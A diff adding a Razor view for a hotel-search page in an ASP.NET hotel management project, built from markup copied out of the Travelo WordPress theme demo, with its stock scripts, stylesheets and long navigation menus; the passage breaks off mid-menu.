@@ -1,0 +1,848 @@
+﻿@model HotelManagementSystem.Models.SearchHotels.SearchHotelListInputModel
+
+@if (this.TempData.ContainsKey("Error"))
+{
+    <div class="alert alert-danger alert-dismissible">
+        <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
+        @this.TempData["Error"]
+    </div>
+}
+
+<!DOCTYPE html>
+<!--[if IE 7 ]> <html class="ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8 ]> <html class="ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if IE   ]> <html class="ie" lang="en-US"> <![endif]-->
+<!--[if lt IE 9]><script src="https://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<html lang="en-US">
+<head>
+    <!-- Page Title -->
+    <title>You searched for - Travelo - Travel/Tour Booking WordPress Theme</title>
+
+    <!-- Meta Tags -->
+    <meta https-equiv="X-UA-Compatible" content="IE=Edge"/>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="shortcut icon" href="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2015/05/favicon.ico" type="image/x-icon" />
+    
+    <!-- CSS for IE -->
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" type="text/css" href="css/ie.css" />
+    <![endif]-->
+
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script type='text/javascript' src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+      <script type='text/javascript' src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
+    <![endif]-->
+    
+<!-- This site is optimized with the Yoast SEO plugin v11.2.1 - httpss://yoast.com/wordpress/plugins/seo/ -->
+<meta name="robots" content="noindex,follow"/>
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="object" />
+<meta property="og:title" content="You searched for - Travelo - Travel/Tour Booking WordPress Theme" />
+<meta property="og:site_name" content="Travelo - Travel/Tour Booking WordPress Theme" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="You searched for - Travelo - Travel/Tour Booking WordPress Theme" />
+<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@@context":"httpss://schema.org","@@graph":[{"@@type":"Organization","@@id":"https://www.soaptheme.net/wordpress/travelo/#organization","name":"","url":"https://www.soaptheme.net/wordpress/travelo/","sameAs":[]},{"@@type":"WebSite","@@id":"https://www.soaptheme.net/wordpress/travelo/#website","url":"https://www.soaptheme.net/wordpress/travelo/","name":"Travelo - Travel/Tour Booking WordPress Theme","publisher":{"@@id":"https://www.soaptheme.net/wordpress/travelo/#organization"},"potentialAction":{"@@type":"SearchAction","target":"https://www.soaptheme.net/wordpress/travelo/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@@type":"SearchResultsPage","@@id":"#webpage","url":false,"inLanguage":"en-US","name":"You searched for - Travelo - Travel/Tour Booking WordPress Theme","isPartOf":{"@@id":"https://www.soaptheme.net/wordpress/travelo/#website"}}]}</script>
+<!-- / Yoast SEO plugin. -->
+
+<link rel='dns-prefetch' href='//maps.googleapis.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Travelo - Travel/Tour Booking WordPress Theme &raquo; Feed" href="https://www.soaptheme.net/wordpress/travelo/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Travelo - Travel/Tour Booking WordPress Theme &raquo; Comments Feed" href="https://www.soaptheme.net/wordpress/travelo/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Travelo - Travel/Tour Booking WordPress Theme &raquo; Accommodations Feed" href="https://www.soaptheme.net/wordpress/travelo/accommodation/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"httpss:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"httpss:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.15"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])?!1:!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-includes/css/dist/block-library/style.min.css?ver=5.2.15' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-plugin-settings-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/revslider/public/assets/css/settings.css?ver=5.4.8' type='text/css' media='all' />
+<style id='rs-plugin-settings-inline-css' type='text/css'>
+#rs-demo-id {}
+</style>
+<link rel='stylesheet' id='trav_style_font_googleapis-css'  href='//fonts.googleapis.com/css?family=Lato%3A300%2C400%2C700%2C900&#038;ver=5.2.15' type='text/css' media='all' />
+<link rel='stylesheet' id='trav_style_animate-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/animate.min.css?ver=5.2.15' type='text/css' media='all' />
+<link rel='stylesheet' id='trav_style_font_awesome-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/font-awesome.min.css?ver=5.2.15' type='text/css' media='all' />
+<link rel='stylesheet' id='trav_style_bootstrap-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/bootstrap.min.css?ver=5.2.15' type='text/css' media='all' />
+<link rel='stylesheet' id='trav_style_flexslider-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/flexslider/flexslider.css?ver=5.2.15' type='text/css' media='all' />
+<link rel='stylesheet' id='trav_style_bxslider-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/jquery.bxslider/jquery.bxslider.css?ver=5.2.15' type='text/css' media='all' />
+<link rel='stylesheet' id='trav_style_timepicker-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/jquery.timepicker/jquery.timepicker.css?ver=5.2.15' type='text/css' media='all' />
+<link rel='stylesheet' id='trav_style_main_style-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/style-light-blue.min.css?ver=5.2.15' type='text/css' media='all' />
+<link rel='stylesheet' id='trav_style_custom-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/custom.css?ver=5.2.15' type='text/css' media='all' />
+<style id='trav_style_custom-inline-css' type='text/css'>
+
+            #header .logo a, #footer .bottom .logo a, .chaser .logo a, .logo-modal {
+                background-image: url(https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/images/logo.png);
+                background-repeat: no-repeat;
+                display: block;
+            }
+            .chaser .logo a {
+                background-size: auto 20px;
+            }.footer-wrapper .widget_nav_menu ul {
+    column-count: 2;
+}
+
+#page-wrapper{overflow-x: hidden; }
+
+.parallax {
+    background-position: center !important;
+    background-attachment: initial !important;
+}
+</style>
+<link rel='stylesheet' id='trav_style_responsive-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/responsive.min.css?ver=5.2.15' type='text/css' media='all' />
+<!--[if lt IE 9]>
+<link rel='stylesheet' id='vc_lte_ie9-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/js_composer/assets/css/vc_lte_ie9.min.css?ver=6.0.1' type='text/css' media='screen' />
+<![endif]-->
+<link rel='stylesheet' id='mc4wp-form-basic-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/mailchimp-for-wp/assets/css/form-basic.min.css?ver=4.5.2' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<link rel='httpss://api.w.org/' href='https://www.soaptheme.net/wordpress/travelo/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.soaptheme.net/wordpress/travelo/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.soaptheme.net/wordpress/travelo/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.2.15" />
+<meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress."/>
+<meta name="generator" content="Powered by Slider Revolution 5.4.8 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
+<script type="text/javascript">function setREVStartSize(e){									
+						try{ e.c=jQuery(e.c);var i=jQuery(window).width(),t=9999,r=0,n=0,l=0,f=0,s=0,h=0;
+							if(e.responsiveLevels&&(jQuery.each(e.responsiveLevels,function(e,f){f>i&&(t=r=f,l=e),i>f&&f>r&&(r=f,n=e)}),t>r&&(l=n)),f=e.gridheight[l]||e.gridheight[0]||e.gridheight,s=e.gridwidth[l]||e.gridwidth[0]||e.gridwidth,h=i/s,h=h>1?1:h,f=Math.round(h*f),"fullscreen"==e.sliderLayout){var u=(e.c.width(),jQuery(window).height());if(void 0!=e.fullScreenOffsetContainer){var c=e.fullScreenOffsetContainer.split(",");if (c) jQuery.each(c,function(e,i){u=jQuery(i).length>0?u-jQuery(i).outerHeight(!0):u}),e.fullScreenOffset.split("%").length>1&&void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0?u-=jQuery(window).height()*parseInt(e.fullScreenOffset,0)/100:void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0&&(u-=parseInt(e.fullScreenOffset,0))}f=u}else void 0!=e.minHeight&&f<e.minHeight&&(f=e.minHeight);e.c.closest(".rev_slider_wrapper").css({height:f})					
+						}catch(d){console.log("Failure at Presize of Slider:"+d)}						
+					};</script>
+<noscript><style type="text/css"> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript></head>
+<body class="archive search search-results post-type-archive post-type-archive-accommodation wpb-js-composer js-comp-ver-6.0.1 vc_responsive">
+    <div id="page-wrapper">
+
+<header id="header" class="navbar-static-top">
+	<div class="topnav hidden-xs">
+		<div class="container">
+			<ul class="quick-menu pull-left">
+									<li><a href="#travelo-login" class="soap-popupbox">MY ACCOUNT</a></li>
+													<li class="ribbon">
+						<a href="#" title="">usd</a>
+						<ul class="menu mini">
+							<li class="active"><a href="/wordpress/travelo/?post_type=accommodation&#038;s=&#038;selected_currency=usd" title="United States Dollar">USD</a></li><li><a href="/wordpress/travelo/?post_type=accommodation&#038;s=&#038;selected_currency=rub" title="Russian Ruble">RUB</a></li>						</ul>
+					</li>
+											</ul>
+			<ul class="quick-menu pull-right">
+				<!--<li><a href="httpss://themeforest.net/item/travelo-traveltour-booking-wordpress-theme/9806696?license=regular&open_purchase_for_item_id=9806696&purchasable=source&ref=SoapTheme" class="button yellow btn-small" style="height: 30px; font-size: 1em;"><i class="soap-icon-shopping"></i> PURCHASE</a></li>-->
+									<li><a href="#travelo-login" class="soap-popupbox">LOGIN</a></li>
+											<li><a href="#travelo-signup" class="soap-popupbox">SIGNUP</a></li>
+									
+			</ul>
+		</div>
+	</div>
+	<div id="main-header">
+
+		<div class="main-header">
+			<a href="#mobile-menu-01" data-toggle="collapse" class="mobile-menu-toggle">
+				Mobile Menu Toggle
+			</a>
+
+			<div class="container">
+				<div class="logo navbar-brand">
+					<a href="https://www.soaptheme.net/wordpress/travelo">
+						<img src="https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/images/logo.png" alt="Travelo &#8211; Travel/Tour Booking WordPress Theme" />
+					</a>
+				</div>
+								<nav id="main-menu" class="menu-main-menu-container"><ul id="menu-main-menu" class="menu"><li id="menu-item-1108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-has-children menu-item-1108"><a href="/">Home</a>
+
+</li>
+<li id="menu-item-657" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-657 megamenu-menu"><a>About</a>
+<li id="menu-item-657" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-657 megamenu-menu"><a>Contact us</a>
+<li id="menu-item-657" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-657 megamenu-menu"><a asp-controller="SearchHotels" asp-action="List">Search Hotels</a>
+<li id="menu-item-657" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-657 megamenu-menu"><a asp-controller="SearchHotels" asp-action="List">Hotels List</a>
+
+
+
+
+</ul></nav>		</div><!-- .container -->
+
+		</div><!-- .main-header -->
+	</div><!-- #main-header -->
+<!-- mobile menu -->
+<nav id="mobile-menu-01" class="mobile-menu collapse"><ul id="mobile-primary-menu" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-has-children menu-item-1108"><a href="https://www.soaptheme.net/wordpress/travelo/">Home</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-1105"><a href="https://www.soaptheme.net/wordpress/travelo/">HomePage1</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1104"><a href="https://www.soaptheme.net/wordpress/travelo/homepage2/">HomePage2</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1103"><a href="https://www.soaptheme.net/wordpress/travelo/homepage3/">HomePage3</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1102"><a href="https://www.soaptheme.net/wordpress/travelo/homepage4/">HomePage4</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1101"><a href="https://www.soaptheme.net/wordpress/travelo/homepage5/">HomePage5</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1100"><a href="https://www.soaptheme.net/wordpress/travelo/homepage6/">HomePage6</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1099"><a href="https://www.soaptheme.net/wordpress/travelo/homepage7/">HomePage7</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1098"><a href="https://www.soaptheme.net/wordpress/travelo/homepage8/">HomePage8</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1432"><a href="https://www.soaptheme.net/wordpress/travelo/homepage9/">Homepage9</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1431"><a href="https://www.soaptheme.net/wordpress/travelo/homepage10/">Homepage10</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1430"><a href="https://www.soaptheme.net/wordpress/travelo/homepage11/">Homepage11</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1509"><a href="https://www.soaptheme.net/wordpress/travelo/homepage12/">HomePage12</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-657"><a href="#">Pages</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-658"><a href="#">Standard Pages</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-771"><a href="#">mega-column</a>
+		<ul class="sub-menu">
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-767"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/layout-with-two-sidebar/">Layout Two Sidebar</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-768"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/layout-without-sidebar/">Layout Full Width</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-769"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/layout-right-sidebar/">Layout Right Sidebar</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-770"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/layout-left-sidebar/">Layout Left Sidebar</a></li>
+		</ul>
+</li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-669"><a href="#">mega-column-1</a>
+		<ul class="sub-menu">
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-661"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/about-us/">About Us 1</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-662"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/about-us-2/">About Us 2</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-663"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/services/">Services 1</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-664"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/services-2/">Services 2</a></li>
+		</ul>
+</li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-670"><a href="#">mege-column-2</a>
+		<ul class="sub-menu">
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-665"><a href="https://www.soaptheme.net/wordpress/travelo/blog/">Blog Full Width</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-666"><a href="https://www.soaptheme.net/wordpress/travelo/blog-with-left-sidebar/">Blog Left Sidebar</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-667"><a href="https://www.soaptheme.net/wordpress/travelo/blog-with-right-sidebar/">Blog Right Sidebar</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-668"><a href="https://www.soaptheme.net/wordpress/travelo/standard-single-image-post/">Blog Read</a></li>
+		</ul>
+</li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-699"><a href="#">mega-column-3</a>
+		<ul class="sub-menu">
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-703"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/contact-us/">Contact Us</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-702"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/contact-us-2/">Contact Us 2</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-701"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/contact-us-3/">Contact Us 3</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-700"><a href="https://www.soaptheme.net/wordpress/travelo/standard-pages/travelo-policies/">Travelo Policies</a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-659"><a href="#">Extra Pages</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-741"><a href="#">mega-column-4</a>
+		<ul class="sub-menu">
+			<li class="menu-item menu-item-type-taxonomy menu-item-object-location menu-item-1267"><a href="https://www.soaptheme.net/wordpress/travelo/location/france/">Things To Do1</a></li>
+			<li class="menu-item menu-item-type-taxonomy menu-item-object-location menu-item-1268"><a href="https://www.soaptheme.net/wordpress/travelo/location/paris/">Things To Do2</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-travel_guide menu-item-1310"><a href="https://www.soaptheme.net/wordpress/travelo/travel-guide/travel-guide-to-paris/">Travel Guide To Paris</a></li>
+		</ul>
+</li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-1313"><a href="#">mega-column-5</a>
+		<ul class="sub-menu">
+			<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1311"><a href="#">Hot Deals – Coming Soon</a></li>
+			<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1312"><a href="#">Travel Stories – Coming Soon</a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-1314"><a href="#">Special Pages</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1315"><a href="https://www.soaptheme.net/wordpress/travelo/login/">LogIn Page</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1319"><a href="https://www.soaptheme.net/wordpress/travelo/partner-signup-page/">Partner SignUp Page</a></li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1316"><a href="https://www.soaptheme.net/wordpress/travelo/404">404 Page</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-1269"><a href="https://www.soaptheme.net/wordpress/travelo/home/">Hotels</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1436"><a href="https://www.soaptheme.net/wordpress/travelo/home/">Hotel Home Page</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1270"><a href="https://www.soaptheme.net/wordpress/travelo/home/">Hotel Home 1</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1427"><a href="https://www.soaptheme.net/wordpress/travelo/hotel-home2/">Hotel Home2</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1426"><a href="https://www.soaptheme.net/wordpress/travelo/hotel-home3/">Hotel Home3</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2768"><a href="https://www.soaptheme.net/wordpress/travelo/hotel-home4/">Hotel Home4</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-has-children menu-item-1297"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=accommodation&#038;s=" aria-current="page">Search Hotels</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1444"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=accommodation&#038;s&#038;view=list">List View</a></li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1442"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=accommodation&#038;s&#038;view=grid">Grid View</a></li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1443"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=accommodation&#038;s&#038;view=block">Block View</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-accommodation menu-item-has-children menu-item-1439"><a href="https://www.soaptheme.net/wordpress/travelo/accommodation/hilton-hotel-and-resorts/">Single Hotel Page</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-accommodation menu-item-1299"><a href="https://www.soaptheme.net/wordpress/travelo/accommodation/hilton-hotel-and-resorts/">Hotel A (without payment)</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-accommodation menu-item-1300"><a href="https://www.soaptheme.net/wordpress/travelo/accommodation/hotel-alpina/">Hotel B (with full payment)</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-accommodation menu-item-1301"><a href="https://www.soaptheme.net/wordpress/travelo/accommodation/ruzzini-palace-hotel/">Hotel C (with part payment)</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1437"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/listing-style1/">Hotels List</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1320"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/listing-style1/">Hotel Listing Style 1</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1321"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/listing-style-2/">Hotel Listing Style 2</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1322"><a href="https://www.soaptheme.net/wordpress/travelo/shortcodes/listing-style-3/">Hotel Listing Style 3</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1271"><a href="https://www.soaptheme.net/wordpress/travelo/tour-home/">Tours</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1435"><a href="https://www.soaptheme.net/wordpress/travelo/tour-home/">Tour Home Page</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1272"><a href="https://www.soaptheme.net/wordpress/travelo/tour-home/">Tour Home 1</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1429"><a href="https://www.soaptheme.net/wordpress/travelo/tour-home2/">Tour Home 2</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1428"><a href="https://www.soaptheme.net/wordpress/travelo/tour-home3/">Tour Home 3</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-1298"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=tour&#038;s=">Search Tours</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1445"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=tour&#038;s&#038;view=grid">Grid View</a></li>
+		<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1446"><a href="https://www.soaptheme.net/wordpress/travelo/?post_type=tour&#038;s&#038;view=list">List View</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-tour menu-item-has-children menu-item-1438"><a href="https://www.soaptheme.net/wordpress/travelo/tour/florence-day/">Single Tour Page</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-tour menu-item-1302"><a href="https://www.soaptheme.net/wordpress/travelo/tour/florence-day/">Tour A (without variation)</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-tour menu-item-1303"><a href="https://www.soaptheme.net/wordpress/travelo/tour/tour-colosseum/">Tour B (with day variation)</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-tour menu-item-1304"><a href="https://www.soaptheme.net/wordpress/travelo/tour/rome-city-tour/">Tour C (with full variation)</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1433"><a href="https://www.soaptheme.net/wordpress/travelo/fancy-package-2-columns/">Tours List</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1291"><a href="https://www.soaptheme.net/wordpress/travelo/fancy-package-2-columns/">Fancy Package – 2 Columns</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1292"><a href="https://www.soaptheme.net/wordpress/travelo/fancy-package-3-columns/">Fancy Package – 3 Columns</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1293"><a href="https://www.soaptheme.net/wordpress/travelo/fancy-package-4-columns/">Fancy Package – 4 Columns</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1296"><a href="https://www.soaptheme.net/wordpress/travelo/package-2-columns/">Simple Package – 2 Columns</a></li>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1294"><a href="https://www.soaptheme.net/wordpress/travelo/package-3-columns/">Simple Package – 3 Columns</a></li>
